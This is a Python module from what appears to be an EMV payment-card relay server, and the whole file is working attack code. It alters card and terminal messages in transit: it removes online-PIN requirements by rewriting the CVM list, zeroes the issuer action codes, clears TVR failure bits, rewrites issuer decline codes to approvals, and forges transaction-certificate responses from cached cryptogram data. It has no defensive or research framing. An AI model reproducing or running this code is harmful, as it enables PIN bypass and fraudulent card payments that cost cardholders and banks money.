# -*- coding: utf-8 -*-
# mutations.py
# -*- coding: utf-8 -*-
"""All byte-level mutations, forges, and dispatches."""

from __future__ import annotations
from typing import Optional, Tuple, Dict, Callable

from constants import (
    APDU_INS, INS_EXTERNAL_AUTHENTICATE, INS_GENERATE_AC,
    INS_GET_PROCESSING_OPTIONS, INS_READ_RECORD,
    TEMPLATE_77, TEMPLATE_80, CID_TC,
    CID_NAME_MAP, ARC_REWRITE_MAP,
    SW_9000, SW_6F00, BRAND_UNKNOWN, brand_iad_default,
)
from emv import ArqcCache
from tlv import find_tlv, build_tlv, replace_tlv

import logging
log = logging.getLogger("RelayServer")

# ======================================================================
# AIP mutation - clears CV bit in GPO response
# ======================================================================

def mutate_gpo_response(rapdu: bytes) -> bytes:
    """Clear the CV bit (bit 0 of AIP byte 0) in a GPO response."""
    if len(rapdu) < 3:
        return rapdu
    body = rapdu[:-2]
    sw = rapdu[-2:]
    if not body:
        return rapdu
    first = body[0]

    if first == TEMPLATE_77:
        aip = find_tlv(body, 0x82)
        if aip and len(aip) >= 2 and (aip[0] & 0x01):
            changed = bytes([aip[0] & ~0x01]) + aip[1:]
            log.info(f"[AIP-MUTATE] CV bit cleared (0x{aip[0]:02X}>0x{changed[0]:02X})")
            return replace_tlv(body, 0x82, changed) + sw
        return rapdu

    if first == TEMPLATE_80:
        # Template 80: length byte(s) then payload
        if len(body) < 2:
            return rapdu
        length_first = body[1]
        if length_first < 0x80:
            hdr_size = 2
        elif length_first == 0x81 and len(body) >= 3:
            hdr_size = 3
        elif length_first == 0x82 and len(body) >= 4:
            hdr_size = 4
        else:
            return rapdu
        inner = bytearray(body[hdr_size:])
        if len(inner) >= 2 and (inner[0] & 0x01):
            original = inner[0]
            inner[0] &= ~0x01
            log.info(f"[AIP-MUTATE] CV bit cleared (0x{original:02X}>0x{inner[0]:02X})")
            payload_len = len(inner)
            if payload_len < 0x80:
                lb = bytes([payload_len])
            elif payload_len < 0x100:
                lb = bytes([0x81, payload_len])
            else:
                lb = bytes([0x82, (payload_len >> 8) & 0xFF, payload_len & 0xFF])
            return bytes([first]) + lb + bytes(inner) + sw
        return rapdu

    return rapdu

# ======================================================================
# CVM & IAC mutation - replaces CVM list and zeroes IAC in READ RECORD
# ======================================================================

def mutate_read_record_response(rapdu: bytes) -> bytes:
    """Replace CVM list with No CVM and zero IAC-Default/Denial/Online."""
    if len(rapdu) < 3:
        return rapdu
    body = rapdu[:-2]
    sw = rapdu[-2:]
    if not body:
        return rapdu

    mutated = False
    working = body

    # CVM list (tag 8E)
    cvm = find_tlv(working, 0x8E)
    if cvm is not None:
        new_cvm = bytes.fromhex("000000000000000000001F031E030000")
        if cvm != new_cvm:
            log.info("[CVM-MUTATE] Online PIN removed, No CVM forced")
            working = replace_tlv(working, 0x8E, new_cvm)
            mutated = True

    # IAC tags
    for tag, name in ((0x9F0D, "IAC-Default"), (0x9F0E, "IAC-Denial"),
                      (0x9F0F, "IAC-Online")):
        value = find_tlv(working, tag)
        if value is not None and any(value):
            zeroed = b"\x00" * len(value)
            log.info(f"[IAC-MUTATE] {name} zeroed: {value.hex().upper()} -> {zeroed.hex().upper()}")
            working = replace_tlv(working, tag, zeroed)
            mutated = True

    return working + sw if mutated else rapdu

# ======================================================================
# TVR mutation - clears ODA failure and CVM bits in GENERATE AC CAPDU
# ======================================================================

def mutate_tvr_in_generate_ac(capdu: bytes) -> Tuple[bytes, Optional[str]]:
    """Clear TVR bits: ODA failure (byte1 bit8) and CVM failure+PIN (byte3 bits8+7)."""
    if len(capdu) < 5 or capdu[APDU_INS] != INS_GENERATE_AC:
        return capdu, None
    lc = capdu[4]
    if lc == 0 or 5 + lc > len(capdu):
        return capdu, None

    header = capdu[:5]
    data = bytearray(capdu[5:5 + lc])
    tail = capdu[5 + lc:]

    # Tag 95 is always 5 bytes. Look for 95 05.
    offset = -1
    for i in range(len(data) - 6):
        if data[i] == 0x95 and data[i+1] == 0x05:
            offset = i + 2
            break
    if offset < 0:
        return capdu, None

    original_tvr = bytes(data[offset:offset+5])
    tvr = bytearray(original_tvr)
    tvr[0] &= ~0x80          # clear ODA failure
    tvr[2] &= ~0x80          # clear CVM failure
    tvr[2] &= ~0x40          # clear Online PIN entered
    data[offset:offset+5] = tvr

    result = header + bytes(data) + tail
    note = f"TVR mutated {original_tvr.hex().upper()} -> {bytes(tvr).hex().upper()}"
    log.info(f"[TVR-MUTATE] {note}")
    return result, note

# ======================================================================
# ARPC rewrite - changes issuer decline ARC codes to approve
# ======================================================================

def rewrite_arpc_in_capdu(capdu: bytes) -> Tuple[bytes, Optional[str]]:
    """Rewrite ARC in EXTERNAL AUTHENTICATE (positional) or GENERATE AC (tag 91)."""
    if len(capdu) < 5:
        return capdu, None
    ins = capdu[APDU_INS]
    if ins not in (INS_EXTERNAL_AUTHENTICATE, INS_GENERATE_AC):
        return capdu, None
    lc = capdu[4]
    if lc == 0 or 5 + lc > len(capdu):
        return capdu, None

    header = capdu[:5]
    data = bytearray(capdu[5:5 + lc])
    tail = capdu[5 + lc:]

    rewritten = False
    old_val_hex = ""
    new_val_hex = ""
    offset_found = -1

    if ins == INS_EXTERNAL_AUTHENTICATE and len(data) >= 10:
        offset_found = 8
        arc = bytes(data[offset_found:offset_found + 2])
        approve = ARC_REWRITE_MAP.get(arc)
        if approve is not None:
            old_val_hex = arc.hex().upper()
            new_val_hex = approve.hex().upper()
            data[offset_found:offset_found + 2] = approve
            rewritten = True

    elif ins == INS_GENERATE_AC:
        tag91 = find_tlv(bytes(data), 0x91)
        if tag91 is not None and len(tag91) >= 10:
            arc = tag91[8:10]
            approve = ARC_REWRITE_MAP.get(arc)
            if approve is not None:
                new_tag91 = bytearray(tag91)
                new_tag91[8:10] = approve
                replacement = replace_tlv(bytes(data), 0x91, bytes(new_tag91))
                if replacement != bytes(data):
                    old_val_hex = arc.hex().upper()
                    new_val_hex = approve.hex().upper()
                    offset_found = replacement.find(bytes(new_tag91)) + 8
                    data = bytearray(replacement)
                    rewritten = True

    if not rewritten:
        return capdu, None

    result = header + bytes(data) + tail
    ins_name = {INS_EXTERNAL_AUTHENTICATE: "EXTERNAL AUTHENTICATE",
                INS_GENERATE_AC: "GENERATE AC"}.get(ins, "?")
    note = f"ARC {old_val_hex}->{new_val_hex} at offset {offset_found} in {ins_name}"
    log.info(f"[ARPC-REWRITE] {note}")
    return result, note

# ======================================================================
# 2nd GAC forge - builds forged TC response from cached ARQC data
# ======================================================================

def forge_2nd_gac_template_77(cache: ArqcCache,
                               forced_cid: int = CID_TC,
                               brand: str = BRAND_UNKNOWN) -> bytes:
    cid = bytes([forced_cid])
    atc = cache.atc or b"\x00\x01"
    ac = cache.ac or b"\x41\x41\x41\x41\x41\x41\x41\x41"
    iad = cache.iad or brand_iad_default(brand)
    inner = (build_tlv(0x9F27, cid)
             + build_tlv(0x9F36, atc)
             + build_tlv(0x9F26, ac)
             + build_tlv(0x9F10, iad))
    return build_tlv(TEMPLATE_77, inner) + SW_9000

def forge_2nd_gac_template_80(cache: ArqcCache,
                               forced_cid: int = CID_TC,
                               brand: str = BRAND_UNKNOWN) -> bytes:
    cid = bytes([forced_cid])
    atc = cache.atc or b"\x00\x01"
    ac = cache.ac or b"\x41\x41\x41\x41\x41\x41\x41\x41"
    iad = cache.iad or brand_iad_default(brand)
    payload = cid + atc + ac + iad
    length = len(payload)
    if length < 0x80:
        length_bytes = bytes([length])
    elif length < 0x100:
        length_bytes = bytes([0x81, length])
    else:
        length_bytes = bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
    return bytes([TEMPLATE_80]) + length_bytes + payload + SW_9000

FORGE_DISPATCH: Dict[int, Callable[[ArqcCache, int, str], bytes]] = {
    TEMPLATE_77: forge_2nd_gac_template_77,
    TEMPLATE_80: forge_2nd_gac_template_80,
}

def forge_2nd_gac(cache: ArqcCache,
                  forced_cid: int = CID_TC,
                  brand: str = BRAND_UNKNOWN) -> Optional[bytes]:
    template = cache.template
    if template is None:
        return None
    forger = FORGE_DISPATCH.get(template)
    if forger is None:
        return None
    return forger(cache, forced_cid, brand)